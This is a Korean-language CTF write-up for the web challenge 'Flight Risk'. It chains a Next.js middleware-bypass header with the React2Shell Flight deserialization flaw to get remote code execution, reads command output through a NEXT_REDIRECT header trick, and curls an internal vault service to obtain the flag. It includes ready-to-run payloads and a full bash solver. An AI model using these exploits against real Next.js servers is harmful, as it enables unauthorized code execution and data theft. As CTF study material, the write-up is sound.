---
title: "[Web] Flight Risk"
description: Writeup for "Flight Risk" from EHAX CTF 2026.
date: 2026-03-01 09:00:00 +0900
categories: [CTF, EHAX CTF 2026]
tags: [Web]
toc: true
comments: false
---

# Flight Risk (EHAX CTF 2026)

---

- **Name:** Flight Risk
- **Category:** Web
- **Difficulty:** ★★★☆☆ (411 points, 68 solves / 887 teams)
- **Connection:** `http://chall.ehax.in:4269`
- **Flag format:** `EHAX{...}`

---

### 개요

`System.Greet()`라는 이름 입력 폼이 있는 Next.js 15 앱입니다.
이름을 입력하면 인사말을 돌려줍니다. 겉으로 보이는 건 이게 전부입니다.

응답 헤더를 보면:

```
Server: nginx/1.29.5
X-Powered-By: Next.js
```

서비스 구조는 세 겹입니다.

```
인터넷
  │
  ▼
nginx (프록시)
  │
  ▼
Next.js 15 (미들웨어 WAF)
  │
  ▼
internal-vault:9009 (flag.txt)
```

미들웨어가 WAF 역할을 하고,
플래그는 외부에서 접근할 수 없는 내부 서비스에 있습니다.

문제 이름 **"FLIGHT RISK"** 가 핵심 힌트입니다.
React에서 **Flight**는 RSC(React Server Components)가
클라이언트와 서버 사이에 데이터를 주고받을 때 사용하는 프로토콜 이름입니다.

---

### 소스 분석

#### 클라이언트 JS에서 Server Action 발견

Next.js가 번들한 클라이언트 JS를 읽어봅니다.

```
GET /_next/static/chunks/app/page-428009e448e772a0.js
```

안에서 이런 코드가 보입니다.

```javascript
createServerReference(
  "7fc5b26191e27c53f8a74e83e3ab54f48edd0dbd",
  callServer, void 0, findSourceMapURL,
  "greetUser"
);
```

**Server Action**입니다.
폼을 제출하면 서버에서 실행되는 함수이고,
긴 hex 문자열이 그 함수의 고유 ID입니다.

#### 빌드 매니페스트 — 숨겨진 라우트

빌드 매니페스트에서 Bloom 필터로 정의된 라우트 3개를 확인할 수 있지만
`/`만 접근됩니다.
`/vault`는 404입니다.

문제 설명에 *"the vault is still open"* 이라는 힌트가 있으니,
vault는 내부적으로 존재합니다.
직접 접근할 수 없을 뿐입니다.

---

### 취약점 분석

두 CVE를 체이닝합니다.

#### CVE-2025-29927 — 미들웨어 WAF 우회

Next.js는 미들웨어 내부에서 무한 루프를 방지하기 위해
`x-middleware-subrequest`라는 헤더를 사용합니다.
이 헤더가 있으면 미들웨어를 다시 실행하지 않습니다.

문제는 **외부에서도 이 헤더를 보낼 수 있다**는 점입니다.
헤더를 포함해서 요청하면 미들웨어(WAF) 전체를 건너뜁니다.

Next.js 15에서 동작하는 값은 이렇습니다.

```
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

확인해봅니다.

```bash
# 헤더 없이 → WAF 차단
curl -X POST "http://chall.ehax.in:4269/" \
  -H "Next-Action: x" \
  -F '0={"then":"$1:__proto__:then"}'
# → {"error":"WAF Alert: Malicious payload detected."}

# 헤더 추가 → 통과
curl -X POST "http://chall.ehax.in:4269/" \
  -H "Next-Action: x" \
  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  -F '0={"then":"$1:__proto__:then"}'
# → 서버가 요청 처리
```

#### CVE-2025-55182 — React2Shell (CVSS 10.0)

2025년 12월에 공개된 RCE 취약점입니다.
RSC의 Flight 프로토콜 역직렬화 과정에서 임의 코드가 실행됩니다.

동작 원리를 단계별로 보면 이렇습니다.

```
Flight 역직렬화 시작
  │
  ├─ "$1:__proto__:then"
  │   → chunk 객체의 프로토타입 체인을 따라 올라감
  │
  ├─ "$1:constructor:constructor"
  │   → Function 생성자에 도달
  │
  └─ _prefix 값이 Function()에 전달됨
      → 임의 JavaScript 실행
```

역직렬화 과정에서 `$1:property` 형태 참조가
프로토타입 체인을 타고 올라가는 것을 막지 않기 때문에
`Function` 생성자까지 도달할 수 있습니다.

**중요한 점:** RCE는 역직렬화 시점에 발생합니다.
Action ID 검증 전이라서 `Next-Action: x` 같은 아무 값이나 써도 됩니다.

---

### 출력 탈취 방법 — NEXT_REDIRECT 트릭

프로덕션 Next.js는 에러 메시지를 해시로 가립니다.
`throw new Error(result)`로는 결과를 읽을 수 없습니다.

Next.js에는 리다이렉트 에러를 위한 특별 처리가 있습니다.
`digest`에 `NEXT_REDIRECT`가 있으면 `x-action-redirect` 헤더로 URL을 반환합니다.
이 헤더는 해싱되지 않습니다.

```javascript
var result = process.mainModule
  .require('child_process')
  .execSync('COMMAND')
  .toString();

throw Object.assign(
  new Error('NEXT_REDIRECT'),
  { digest: 'NEXT_REDIRECT;push;/' + encodeURIComponent(result) + ';307;' }
);
```

명령 출력이 `x-action-redirect` 헤더에 URL 인코딩되어 나옵니다.

---

### Exploit 실행 과정

**페이로드의 `$` 문자 문제**

페이로드에 `$1`, `$B1337`, `$Q2` 같은 값이 있습니다.
bash는 `$`를 변수로 해석해서 페이로드가 망가집니다.
**quoted heredoc**으로 파일에 저장해서 해결합니다.

**Step 1 — 페이로드 파일 생성**

```bash
cat > /tmp/payload0.txt << 'EOF'
{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var r=process.mainModule.require('child_process').execSync('ls /').toString();throw Object.assign(new Error('NEXT_REDIRECT'),{digest:'NEXT_REDIRECT;push;/'+encodeURIComponent(r)+';307;'});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
EOF

echo -n '"$@0"' > /tmp/payload1.txt
echo -n '[]'    > /tmp/payload2.txt
```

**Step 2 — RCE 및 서버 탐색**

```bash
curl -s -v -X POST "http://chall.ehax.in:4269/?r=$(date +%s%N)" \
  -H "Next-Action: x" \
  -H "Accept: text/x-component" \
  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  -F "0=</tmp/payload0.txt" \
  -F "1=</tmp/payload1.txt" \
  -F "2=</tmp/payload2.txt"
```

> `?r=$(date +%s%N)` 는 캐시 버스팅입니다.
> Next.js가 Server Action 응답을 캐싱하므로
> 매번 다른 URL이어야 실제로 실행됩니다.

응답 헤더:

```
x-action-redirect: /app%0Abin%0Adev%0Aetc%0A...
```

`/app/`을 열어보면 `vault.hint` 파일이 보입니다.

```
internal-vault:9009
```

**Step 3 — 내부 서비스에서 플래그 읽기**

명령어를 `curl -s http://internal-vault:9009/flag.txt`로 교체합니다.

```bash
cat > /tmp/getflag.txt << 'EOF'
{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var r=process.mainModule.require('child_process').execSync('curl -s http://internal-vault:9009/flag.txt').toString();throw Object.assign(new Error('NEXT_REDIRECT'),{digest:'NEXT_REDIRECT;push;/'+encodeURIComponent(r)+';307;'});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
EOF

curl -s -v -X POST "http://chall.ehax.in:4269/?r=$(date +%s%N)" \
  -H "Next-Action: x" \
  -H "Accept: text/x-component" \
  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  -F "0=</tmp/getflag.txt" \
  -F "1=</tmp/payload1.txt" \
  -F "2=</tmp/payload2.txt"
```

응답:

```
x-action-redirect: /EHAX{1_m0r3_r34s0n_t0_us3_4ngu14r}
```

---

### Solver (bash)

```bash
#!/bin/bash
TARGET="http://chall.ehax.in:4269"

cat > /tmp/p0.txt << 'EOF'
{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var r=process.mainModule.require('child_process').execSync('curl -s http://internal-vault:9009/flag.txt').toString();throw Object.assign(new Error('NEXT_REDIRECT'),{digest:'NEXT_REDIRECT;push;/'+encodeURIComponent(r)+';307;'});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
EOF
echo -n '"$@0"' > /tmp/p1.txt
echo -n '[]'    > /tmp/p2.txt

FLAG=$(curl -s -D- -X POST "${TARGET}/?r=${RANDOM}" \
  -H "Next-Action: x" \
  -H "Accept: text/x-component" \
  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  -F "0=</tmp/p0.txt" \
  -F "1=</tmp/p1.txt" \
  -F "2=</tmp/p2.txt" \
  | grep -oP 'x-action-redirect: /\K[^;]+')

python3 -c "import urllib.parse; print(urllib.parse.unquote('$FLAG'))"
```

---

### FLAG

```
EHAX{1_m0r3_r34s0n_t0_us3_4ngu14r}
```

> "1 more reason to use Angular" — React/Next.js 보안에 대한 유머 😄

---

### 요약

이 문제의 핵심은 **두 CVE의 체이닝**입니다.

**CVE-2025-29927** — `x-middleware-subrequest` 헤더를 외부에서 보낼 수 있어
Next.js 미들웨어 전체를 건너뜁니다.
WAF가 React2Shell 페이로드를 막지 못하게 됩니다.

**CVE-2025-55182** — Flight 역직렬화에서 `$1:property` 참조가
프로토타입 체인을 무제한으로 탐색합니다.
`Function` 생성자까지 도달해 임의 코드를 실행합니다.

플래그는 Next.js 서버 자체에 없고 내부 네트워크의 `internal-vault`에 있어,
RCE를 SSRF로 전환해 curl로 가져오는 추가 단계가 필요합니다.

출력 탈취에는 `NEXT_REDIRECT` 다이제스트 트릭을 사용해
에러 해싱 없이 결과를 헤더로 받습니다.

---

### References

- [CVE-2025-29927 — Next.js Middleware Bypass](https://github.com/advisories/GHSA-f82v-jwr5-mffw)
- [CVE-2025-55182 — React2Shell (OffSec)](https://www.offsec.com/blog/cve-2025-55182/)
- [React2Shell Deep Dive (Wiz Research)](https://www.wiz.io/blog/nextjs-cve-2025-55182-react2shell-deep-dive)
